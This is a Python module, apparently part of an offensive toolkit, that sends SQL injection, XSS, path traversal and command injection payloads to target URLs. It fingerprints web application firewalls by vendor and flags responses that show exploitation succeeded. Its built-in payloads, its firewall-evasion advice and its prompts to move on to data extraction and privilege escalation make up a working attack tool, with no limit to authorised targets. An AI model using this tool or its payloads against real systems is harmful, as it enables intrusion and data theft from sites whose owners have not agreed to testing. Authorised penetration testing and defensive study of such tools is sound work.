"""
Payload Tester Module
Tests payloads against target endpoints and analyzes responses.
"""

import requests
import json
import time
import re
from typing import Dict, Any, List, Optional
from urllib.parse import urlparse, urlencode


class PayloadTester:
    """
    Tests attack payloads against target systems and analyzes responses.
    """
    
    def __init__(self):
        self.timeout = 10
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.success_patterns = self._load_success_patterns()
        self.waf_signatures = self._load_waf_signatures()
    
    def _load_success_patterns(self) -> Dict[str, List[str]]:
        """Load patterns that indicate successful exploitation."""
        return {
            "sql_injection": [
                r"SQL syntax.*?error",
                r"mysql_fetch",
                r"pg_query",
                r"ORA-\d+",
                r"Microsoft SQL Server",
                r"SQLSTATE",
                r"root:x:0:0",  # If it dumped /etc/passwd
                r"admin.*?password",
                r"Warning.*?mysqli",
                r"SQLite.*?error"
            ],
            "xss": [
                r"<script>",
                r"javascript:",
                r"onerror=",
                r"onload=",
                r"alert\(",
                r"document\.cookie"
            ],
            "path_traversal": [
                r"root:x:0:0",  # /etc/passwd
                r"\[extensions\]",  # Windows .ini files
                r"daemon:x:",
                r"bin:x:",
                r"for 16-bit app support"  # win.ini
            ],
            "command_injection": [
                r"uid=\d+",  # Output of 'id' command
                r"gid=\d+",
                r"root:x:0:0",
                r"Linux.*?GNU",
                r"total \d+",  # ls output
                r"drwx"  # directory listing
            ],
            "xxe": [
                r"root:x:0:0",
                r"<!DOCTYPE",
                r"ENTITY"
            ],
            "ssrf": [
                r"169\.254\.169\.254",  # AWS metadata
                r"ami-[a-z0-9]+",  # AWS AMI IDs
                r"i-[a-z0-9]+",  # Instance IDs
                r"Internal Server Error",
                r"localhost"
            ]
        }
    
    def _load_waf_signatures(self) -> Dict[str, List[str]]:
        """Load known WAF signatures from error messages/headers."""
        return {
            "cloudflare": ["__cfduid", "cf-ray", "cloudflare"],
            "aws_waf": ["x-amzn-requestid", "x-amz-apigw-id"],
            "akamai": ["akamai", "x-akamai"],
            "imperva": ["incapsula", "imperva", "x-iinfo"],
            "f5": ["bigip", "f5", "x-cnection"],
            "barracuda": ["barra", "x-barracuda"],
            "sucuri": ["sucuri", "x-sucuri"],
            "fortiweb": ["fortigate", "fortiweb"],
            "modsecurity": ["mod_security", "modsec"],
            "wordfence": ["wordfence"],
            "neuroshield": ["neuroshield", "ai-waf"]
        }
    
    def test_payload(
        self,
        url: str,
        payload: str,
        method: str = "POST",
        headers: Optional[Dict[str, str]] = None,
        data_key: str = "query",
        attack_type: str = "sql_injection"
    ) -> Dict[str, Any]:
        """
        Test a payload against a target endpoint.
        
        Args:
            url: Target URL
            payload: Attack payload to test
            method: HTTP method (GET, POST, PUT, etc.)
            headers: Custom headers
            data_key: Parameter name for payload
            attack_type: Type of attack being tested
        
        Returns:
            Test results including bypass status and response analysis
        """
        
        # Prepare headers
        request_headers = {
            "User-Agent": self.user_agent,
            "Accept": "*/*"
        }
        if headers:
            request_headers.update(headers)
        
        # Add Content-Type for JSON if not specified
        if method.upper() in ["POST", "PUT", "PATCH"]:
            if "Content-Type" not in request_headers:
                request_headers["Content-Type"] = "application/json"
        
        result = {
            "payload": payload,
            "url": url,
            "method": method,
            "attack_type": attack_type,
            "timestamp": time.time()
        }
        
        try:
            # Prepare request data
            if method.upper() == "GET":
                # Add payload to URL parameters
                separator = "&" if "?" in url else "?"
                test_url = f"{url}{separator}{data_key}={requests.utils.quote(payload)}"
                response = requests.get(
                    test_url,
                    headers=request_headers,
                    timeout=self.timeout,
                    allow_redirects=False,
                    verify=False  # For testing environments
                )
            else:
                # Send payload in body
                if request_headers.get("Content-Type", "").startswith("application/json"):
                    data = json.dumps({data_key: payload})
                else:
                    data = {data_key: payload}
                
                response = requests.request(
                    method.upper(),
                    url,
                    headers=request_headers,
                    json={data_key: payload} if isinstance(data, dict) else None,
                    data=data if not isinstance(data, dict) else None,
                    timeout=self.timeout,
                    allow_redirects=False,
                    verify=False
                )
            
            # Analyze response
            result.update({
                "status_code": response.status_code,
                "response_time": response.elapsed.total_seconds(),
                "response_headers": dict(response.headers),
                "response_length": len(response.content),
                "response_preview": self._safe_preview(response.text, 500)
            })
            
            # Check if WAF was bypassed
            result["bypassed"] = self._check_bypass(response.status_code)
            result["waf_detected"] = self._detect_waf(response.headers, response.text)
            
            # Check for exploitation success indicators
            result["success_indicators"] = self._check_success_indicators(
                response.text,
                attack_type
            )
            result["potentially_successful"] = len(result["success_indicators"]) > 0
            
            # Generate recommendations
            result["recommendations"] = self._generate_recommendations(result)
            
        except requests.Timeout:
            result.update({
                "error": "Request timeout",
                "bypassed": False,
                "recommendations": ["Target may be rate limiting or slow. Try with longer timeout."]
            })
        except requests.ConnectionError as e:
            result.update({
                "error": f"Connection error: {str(e)}",
                "bypassed": False,
                "recommendations": ["Check if target is accessible. Verify URL and network connectivity."]
            })
        except Exception as e:
            result.update({
                "error": f"Test failed: {str(e)}",
                "bypassed": False,
                "recommendations": ["Review payload format and request parameters."]
            })
        
        return result
    
    def _check_bypass(self, status_code: int) -> bool:
        """
        Check if WAF was bypassed based on status code.
        403 = blocked, others likely bypassed initial WAF check.
        """
        # Common block status codes
        block_codes = [403, 406, 419, 429, 501]
        return status_code not in block_codes
    
    def _detect_waf(self, headers: Dict[str, str], body: str) -> Optional[str]:
        """Attempt to identify WAF vendor from response."""
        
        # Check headers and body for WAF signatures
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower = body.lower()[:1000]  # Check first 1KB
        
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                # Check in headers
                for header_key, header_value in headers_lower.items():
                    if signature.lower() in header_key or signature.lower() in header_value:
                        return waf_name
                # Check in body
                if signature.lower() in body_lower:
                    return waf_name
        
        return None
    
    def _check_success_indicators(self, response_text: str, attack_type: str) -> List[str]:
        """Check response for signs of successful exploitation."""
        
        indicators = []
        patterns = self.success_patterns.get(attack_type, [])
        
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                indicators.append(pattern)
        
        return indicators
    
    def _safe_preview(self, text: str, length: int) -> str:
        """Safely preview response text."""
        try:
            preview = text[:length]
            if len(text) > length:
                preview += "..."
            return preview
        except:
            return "[Binary or non-text response]"
    
    def _generate_recommendations(self, result: Dict[str, Any]) -> List[str]:
        """Generate recommendations based on test results."""
        
        recommendations = []
        
        if result.get("bypassed"):
            if result.get("potentially_successful"):
                recommendations.append("✓ WAF bypassed AND exploitation indicators found! Verify actual vulnerability.")
                recommendations.append("Next: Try data extraction or privilege escalation payloads.")
            else:
                recommendations.append("✓ WAF bypassed but no obvious exploitation signs.")
                recommendations.append("The payload passed WAF filters - try variations to trigger actual vulnerability.")
        else:
            status = result.get("status_code")
            if status == 403:
                recommendations.append("✗ Blocked by WAF (403 Forbidden).")
                recommendations.append("Try: Different obfuscation technique or encoding.")
            elif status == 429:
                recommendations.append("✗ Rate limited. Wait and retry with delays between requests.")
            else:
                recommendations.append(f"Unusual status code: {status}. Investigate further.")
        
        if result.get("waf_detected"):
            recommendations.append(f"WAF detected: {result['waf_detected']}")
        
        return recommendations
    
    def fingerprint_waf(
        self,
        url: str,
        test_payloads: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Fingerprint WAF by testing known malicious patterns.
        
        Args:
            url: Target URL to fingerprint
            test_payloads: Optional custom payloads (uses defaults if not provided)
        
        Returns:
            WAF fingerprint including vendor, blocking patterns, and weaknesses
        """
        
        if test_payloads is None:
            test_payloads = [
                "' OR 1=1--",  # Basic SQL
                "<script>alert(1)</script>",  # Basic XSS
                "../../../../etc/passwd",  # Basic path traversal
                "; ls -la",  # Basic command injection
                "' UNION SELECT NULL--",  # SQL UNION
                "<img src=x onerror=alert(1)>",  # XSS variant
                "..//..//..//etc/passwd",  # Path traversal variant
                "$(whoami)"  # Command injection variant
            ]
        
        fingerprint = {
            "target_url": url,
            "waf_vendor": None,
            "blocked_patterns": [],
            "allowed_patterns": [],
            "blocking_behavior": {},
            "recommendations": []
        }
        
        for payload in test_payloads:
            try:
                response = requests.post(
                    url,
                    json={"test": payload},
                    headers={"User-Agent": self.user_agent},
                    timeout=self.timeout,
                    verify=False
                )
                
                if not fingerprint["waf_vendor"]:
                    fingerprint["waf_vendor"] = self._detect_waf(
                        response.headers,
                        response.text
                    )
                
                if response.status_code == 403:
                    fingerprint["blocked_patterns"].append(payload)
                else:
                    fingerprint["allowed_patterns"].append(payload)
                
                time.sleep(0.5)  # Avoid rate limiting
                
            except Exception as e:
                continue
        
        # Analyze blocking behavior
        if len(fingerprint["blocked_patterns"]) > 0:
            fingerprint["blocking_behavior"]["pattern_based"] = True
            
            # Check if encoding helps
            if "'" in str(fingerprint["blocked_patterns"]):
                fingerprint["recommendations"].append(
                    "WAF blocks single quotes - try encoding or natural language payloads"
                )
            if "<script>" in str(fingerprint["blocked_patterns"]):
                fingerprint["recommendations"].append(
                    "WAF blocks <script> tags - try alternative XSS vectors (SVG, CSS, events)"
                )
            if "../" in str(fingerprint["blocked_patterns"]):
                fingerprint["recommendations"].append(
                    "WAF blocks path traversal - try encoding or alternative separators"
                )
        
        if len(fingerprint["allowed_patterns"]) > 0:
            fingerprint["recommendations"].append(
                "Some basic patterns passed - WAF may have coverage gaps"
            )
        
        return fingerprint
